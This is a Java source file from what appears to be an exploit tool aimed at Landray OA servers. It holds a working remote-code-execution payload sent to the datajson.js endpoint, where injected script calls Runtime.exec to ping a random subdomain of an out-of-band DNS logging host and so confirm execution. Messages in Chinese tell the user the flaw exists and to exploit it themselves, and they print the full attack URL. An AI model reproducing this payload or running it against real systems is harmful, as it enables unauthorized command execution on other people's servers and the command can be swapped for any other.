package exp.oa.landrayoa;

import core.Exploitlnterface;

import java.util.HashMap;

import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class landray_datajson implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        });
        return false;
    }

    private Boolean att(String url, TextArea textArea) {
        String dnslog = shell.readFile(shell.dnspath).replace("http://", "").replace("/", "");
        shell.readFile(shell.dnspath).replace("http://", "");
        String payload = "/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test()%7B%20return%20java.lang.Runtime%7D;r=test();r.getRuntime().exec(%22ping%20-c%204%20" + shell.getRandomString() + "." + dnslog + "%22)&type=1";
        Response response = HttpTools.get(url + payload, new HashMap<String, String>(), "utf-8");
        if (response.getCode() == 200 && response.getText().contains("success")) {
            Platform.runLater(() -> {
                textArea.appendText("\n漏洞存在 请自行利用\n" + url + payload);
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n landray_datajson-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }


    }
}
